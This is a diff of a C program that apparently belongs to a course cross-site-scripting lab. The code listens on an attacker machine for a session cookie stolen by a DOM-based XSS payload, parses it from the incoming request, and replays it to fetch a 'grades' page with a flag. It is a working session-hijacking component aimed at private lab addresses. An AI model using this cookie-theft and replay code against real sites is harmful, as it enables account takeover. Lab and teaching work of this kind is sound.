@@ -1,8 +1,3 @@
-//
-// Created by xssenv on 12/13/25.
-// added as a stub for further use
-// should run from attacker server
-// need to add socket instructions for automated tests
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -14,8 +9,8 @@
 #define PORT 8080
 #define BUF_SZ 16384
 
-#define HOST "http://localhost:8080/"
-#define PATH "/GradersPortalTask2.php"
+#define HOST "http://192.168.1.203:80/"
+#define PATH "/studentManagerDOMBASED.php"
 #define SERVER_IP "192.168.1.201"
 #define WEBSERVER_IP "192.168.1.203"
 
@@ -55,7 +50,18 @@ int receiveCookie(char *cookie, size_t cookie_sz) {
     if (s < 0) return 0;
 
     int opt = 1;
-    (void)setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, (socklen_t)sizeof(opt));
+    if (setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
+        printf("setsockopt(SO_REUSEADDR) failed...\n");
+        close(s);
+        exit(1);
+    }
+
+    opt = 1;
+    if (setsockopt(s, SOL_SOCKET, SO_REUSEPORT, &opt, sizeof(opt)) < 0) {
+        printf("setsockopt(SO_REUSEPORT) failed...\n");
+        close(s);
+        exit(1);
+    }
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
@@ -85,30 +91,42 @@ int receiveCookie(char *cookie, size_t cookie_sz) {
         return 0;
     }
     buf[n] = '\0';
-
+    printf("%s\n", buf);
     // find body
-    char *body = strstr(buf, "\r\n\r\n");
-    if (!body) {
+    char *get_line = buf;
+    char *line_end = strstr(buf, "\r\n");
+    if (!line_end) {
         close(c);
         close(s);
         return 0;
     }
-    body += 4;
 
     //find cookie
-    char *p = strstr(body, "\"cookie\"");
-    if (p) {
-        p = strchr(p, ':');
-        if (p) {
-            p++;
-            while (*p == ' ' || *p == '"') p++;
-            char *end = strchr(p, '"');
-            if (end && (size_t)(end - p) < cookie_sz) {
-                memcpy(cookie, p, (size_t)(end - p));
-                cookie[end-p] = '\0';
-            }
-        }
+    char *cookie_start = strstr(get_line, "cookie=");
+    if (!cookie_start) {
+        close(c);
+        close(s);
+        return 0;
     }
+
+    cookie_start += 7;
+
+    char* cookie_end = strchr(cookie_start, ' ');
+    if (!cookie_end) {
+        cookie_end = strstr(cookie_start, " HTTP");
+    }
+    if (!cookie_end) {
+        close(c);
+        close(s);
+        return (0);
+    }
+
+    size_t len = (size_t)(cookie_end - cookie_start);
+    if (len >= cookie_sz) {
+        len = cookie_sz - 1;
+    }
+    memcpy(cookie, cookie_start, len);
+    cookie[len] = '\0';
 
     //http response
     const char resp[] =
@@ -156,7 +174,7 @@ int getFlagFromGrades(char *cookie) {
         off += (size_t)s;
     }
 
-    FILE *fp = fopen("spoofed-stored.txt", "wb");
+    FILE *fp = fopen("spoofed-dom.txt", "wb");
     if (!fp) return 0;
 
     char buf[8192];
@@ -169,11 +187,15 @@ int getFlagFromGrades(char *cookie) {
 
     fclose(fp);
     close(sockfd);
-    printf("Saved raw HTTP response to spoofed-reflected.txt\n");
+    printf("Saved raw HTTP response to spoofed-dom.txt\n");
     return 0;
 }
 
 
 int main(void) {
-    
+    char cookie[1024] = {0};
+    receiveCookie(cookie, sizeof(cookie));
+    printf("%s\n", cookie);
+    getFlagFromGrades(cookie);
+    return 0;
 }
